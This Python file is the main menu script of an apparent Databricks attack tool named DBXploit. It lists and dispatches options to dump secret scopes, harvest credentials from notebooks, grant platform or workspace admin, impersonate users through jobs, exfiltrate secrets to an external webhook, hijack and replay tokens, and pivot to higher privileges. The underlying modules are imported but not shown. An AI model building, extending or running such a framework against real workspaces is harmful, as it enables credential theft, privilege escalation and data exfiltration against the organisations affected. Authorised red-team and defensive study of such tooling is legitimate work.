from core import secrets_audit, secrets_dump, recon, notebook_scan, privilege_escalation, impersonate_job, access_summary, secret_exfiltrate, pivot_chain, workspace_scraper, token_hijack, token_relay
from core.impersonate_job import impersonate_user_via_job, REQUIRES_WORKSPACE_ADMIN
from core.secret_exfiltrate import exfiltrate_secrets
from core.token_relay import relay_tokens
from core.access_summary import generate_access_summary
from core.workspace_scraper import dump_workspace_scrape
from core.token_hijack import hijack_token_session, replay_token_activity
from core.pivot_chain import try_auto_escalate
from core.whoami import show_current_token_identity
from core.privilege_escalation import check_token_roles
from config import log

menu_options = [
    ("1", "Audit Secret Scopes and ACLs", lambda: secrets_audit.audit_secret_scopes(input("Only show weak ACLs? (y/n): ").strip().lower() == 'y')),
    ("2", "Dump Secrets from Accessible Scopes", secrets_dump.dump_secrets),
    ("3", "Scan Notebooks for Hardcoded Secrets", notebook_scan.extract_credentials_from_notebooks),
    ("4", "List Jobs, Clusters, DBFS, and Workspace Items", lambda: (recon.list_jobs(), recon.list_clusters(), recon.list_dbfs(), recon.list_workspace_items())),
    ("5", "List SCIM Service Principals and Groups", lambda: (privilege_escalation.list_service_principals(), privilege_escalation.list_groups())),
    ("6", "Make User a Platform Admin", lambda: privilege_escalation.make_user_platform_admin(input("Enter EID to promote to platform admin: "))),
    ("7", "Make User a Workspace Admin", lambda: privilege_escalation.make_user_workspace_admin(input("Enter EID to promote to workspace admin: "))),
    ("8", "Submit Impersonation Job (Workspace Admin Required)", lambda: impersonate_user_via_job(input("Enter EID to impersonate via job: ")) if REQUIRES_WORKSPACE_ADMIN else log("[!] Requires Workspace Admin", always_print=True)),
    ("9", "Exfiltrate Secrets to Webhook", lambda: exfiltrate_secrets(input("Enter external webhook URL to receive secrets: "))),
    ("10", "Token Relay: Extract and Validate Tokens", relay_tokens),
    ("11", "Generate Access Summary", generate_access_summary),
    ("12", "Scrape Workspace Content", dump_workspace_scrape),
    ("13", "Replay a Hijacked Token", lambda: (token := input("Enter hijacked token to replay: ")) and (hijack_token_session(token), replay_token_activity(token))),
    ("14", "Automated Privileged Pivot", try_auto_escalate),
    ("99", "Show Current Token Identity", show_current_token_identity),
    ("0", "Exit", None)
]

def main():
    roles, entitlements = check_token_roles()
    restricted = {
        "6": "account_admin",
        "7": "account_admin",
        "8": "workspace-admin"
    }
    while True:
        try:
            print("\nDBXploit - Databricks Exploitation Framework\n" + "=" * 50)
            for key, desc, _ in menu_options:
                if key in restricted:
                    if restricted[key] not in roles + entitlements:
                        desc += " [REQUIRES ELEVATED PRIVILEGES]"
                print(f"[{key}] {desc}")
            choice = input("\nSelect an option: ").strip()
            action = next((fn for code, _, fn in menu_options if code == choice), None)
            if choice == "0":
                break
            elif action:
                action()
            else:
                print("Invalid choice.")
        except KeyboardInterrupt:
            print("\n[!] Operation cancelled by user. Returning to main menu.\n")
        except Exception as e:
            log(f"[!] Unexpected error: {e}", level="error", always_print=True)

if __name__ == "__main__":
    main()
